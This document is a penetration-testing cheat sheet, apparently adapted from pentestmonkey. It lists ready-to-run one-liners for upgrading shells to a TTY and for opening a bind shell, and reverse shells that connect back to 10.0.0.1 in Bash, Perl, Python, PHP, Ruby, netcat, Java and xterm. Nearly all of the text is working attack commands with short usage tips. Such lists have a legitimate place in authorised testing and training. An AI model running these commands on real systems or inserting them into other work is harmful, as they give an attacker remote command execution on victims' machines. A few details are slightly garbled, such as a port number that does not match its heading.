## Shells

### TTY Shells

http://pentestmonkey.net/blog/post-exploitation-without-a-tty

Upgrade your shell to a full TTY
```
	python -c 'import pty; pty.spawn("/bin/sh")'
	
	echo os.system('/bin/bash')
	
	/bin/sh -i
	
	perl —e 'exec "/bin/sh";'
	
	perl: exec "/bin/sh";
	
	ruby: exec "/bin/sh"
	
	lua: os.execute('/bin/sh')
```

(From within IRB)
```	
	exec "/bin/sh"
```

(From within vi)
```
	:!bash
```

(From within vi)
```
	:set shell=/bin/bash:shell
```

(From within nmap)
```
	!sh
```

### Bind Shells

Perl Bind Shell (Port 1000)
```
	perl -e 'use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/usr/bin/bash -i");};'
```

### Reverse Shells

Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
```
	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

PERL

Here’s a shorter, feature-free version of the perl-reverse-shell:
```
	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python
This was tested under Linux / Python 2.7:
```	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
```	
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby
```
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
```
	nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
```
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Java
```	
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()
```

xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
```
	xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
```	
	Xnest :1
```

your’ll need to authorise the target to connect to you (command also run on your host):
```	
	xhost +targetip
```
